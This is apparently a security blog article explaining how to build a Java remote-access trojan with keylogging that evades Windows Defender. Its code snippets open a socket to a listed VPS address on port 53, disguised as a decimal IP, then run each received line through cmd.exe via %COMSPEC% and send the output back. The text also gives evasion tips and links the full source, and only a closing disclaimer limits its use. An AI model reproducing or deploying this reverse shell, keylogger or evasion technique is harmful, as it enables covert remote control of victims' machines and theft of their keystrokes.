---
layout: article
title: Evading AV with Network Sockets / Keylogger RAT
description: Compiling and running an unsigned Windows executable and hoping for a remote command session without any detection is a difficult task to achieve, however, sometimes there are easier ways of bypassing AVs. This article will outline a simple but functional remote 'shell' with keylogging capabilities against a fully up-to-date Windows Defender.
category: research
modified: 31 August, 2020
tags: [java, keylogger, evasion, sockets]
image:
    path: "/assets/images/Keylogger2.png"
---

<link rel="stylesheet" href="/assets/css/github.css">
<style>
.wrapper {
  max-width: 700px;
}
section {
  max-width: 700px;
  padding: 30px 0px 0px 0px;
}
pre, code {
    white-space: pre-wrap;
}
@media all and (max-width:480px) {
    img {float:center;display:block;margin:0 auto;}
}

@media all and (min-width:480px) {
    img {float:left;padding-right:30px;margin:0 auto;}
}
ul {
    list-style-image: none;
    list-style: none;
}
ul ul {
    margin:0;
}
p + ul {
    list-style: disc !important;
}
img {
    margin-bottom:8px;
    width: 100%;
}
pre, code {
    white-space: pre-wrap;
    word-wrap: break-word;
}
.highlighter-rouge {
    color: cyan;
}
</style>   

<i>**{{page.modified}}** — [Go back to homepage](../)</i>
# {{page.title}}

RAT trojans typically use WinAPI functions for injecting malicious shellcode in memory (RAM) which is then executed. While there are numerous methods of evading anti-malware or EDR solutions for such RATs that reside in disk using techniques such as partial code encryption, they can still be caught during runtime as a result of vendors using behaviour analysis through machine learning for exploit prevention. Such controls are difficult to bypass, however, instead of leveraging WinAPI calls this time, sometimes simplicity is key.

A network socket is an endpoint of a two-way communication (TCP or UDP), identified by an IP address and a port number, which is used to send or receive data within a node on a computer network (could be LAN, WAN). They have a wide range of use cases, usually in a client-server architecture such as basic chat applications. A lot of programming languages implement libraries for programming sockets, and in this case, I will be using Java considering that it can be compiled to bytecode in almost all operating systems which have JVM. Furthermore, its compile logic makes most of the Java applications seem legitimate, such as our case in programming a RAT trojan with a simple keylogging capability.

Unfortunately, in comparison with Python, Java requires more lines of code for using sockets. For demonstration purposes, I will be using one of my VPS servers as the listener IP address of `185.141.61.227`, which can be written in decimal format as `"3113041379"` thanks to [IP-Obfuscator.py](https://github.com/C-REMO/Obscure-IP-Obfuscator):

{% highlight java %}
Socket s = new Socket("3113041379", 53);
{% endhighlight %}

This will initiate a communication channel with the CNC server, so you need a listener program such as netcat (for the sake of demonstration) operating in port 53 – a common port found in malware as it is mainly allowed in firewalls and typically not scrutinized enough from a security perspective. Sockets in Java also require input and output streams for basic I/O operations, as well as `PrintWriter()` and `BufferedReader()` to properly write outward data.

{% highlight java %}
InputStream i = s.getInputStream();
OutputStream o = s.getOutputStream();
PrintWriter pw = new PrintWriter(o, true);
BufferedReader rr = new BufferedReader(new InputStreamReader(i));
{% endhighlight %}

Since our target OS is Windows, we will use the `%COMSPEC%` environment variable which simply points to `C:\WINDOWS\system32\cmd.exe` – useful in bypassing string-referenced checks – to execute incoming data from a non-empty buffer:

{% highlight java %}
String inc, comSpec = System.getenv("comSpec") + " /c ";

while(true){
    if((inc = rr.readLine()) != null){
        Process p = Runtime.getRuntime().exec(comSpec + inc);
        Scanner sc = new Scanner(p.getInputStream());
        while (sc.hasNext()) pw.println(sc.nextLine());
        pw.flush();
        sc.close();
    }
}
{% endhighlight %}

Furthermore, we will also use the Path object to send the current working directory before command output for readability and convenience:

{% highlight java %}
Path crp = Paths.get("");
String rp = crp.toAbsolutePath().toString();
{% endhighlight %}

To add keylogging capabilities in real-time through sockets, I used the [log4j](https://logging.apache.org/log4j/2.x/) API utility to capture user keystrokes. After integration, the full source code is as follows:

<script src="https://gist.github.com/artikrh/9fe78a9c3ecca773be4ab8e4f200c043.js"></script>

Compiling this Java program into a Windows executable comprises of converting `.jar` to `.exe` using [various tools](https://stackoverflow.com/questions/2011664/compiling-a-java-program-into-an-executable), however, I will be using the IntelliJ IDE to [directly build a binary artifact](https://www.youtube.com/watch?v=_KHCHiH2RZ0) and run the program along a fully up-to-date Windows Defender. The `klon` keyword will trigger the keylogging capability, whereas `kloff` will stop the key listener:

![Proof of Concept](/assets/images/Keylogger.png)

Used libraries:
- jnativehook-2.1.0.jar
- log4j-api-2.10.0.jar
- log4j-core-2.10.0.jar
- log4j-slf4j-impl-2.10.0.jar
- slf4j-api-1.8.0-alpha2.jar

<i><b>Disclaimer:</b> Usage of this application for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. I assume no liability and I am not responsible for any misuse or damage caused.</i>

<i>[Go back to homepage](../)</i>
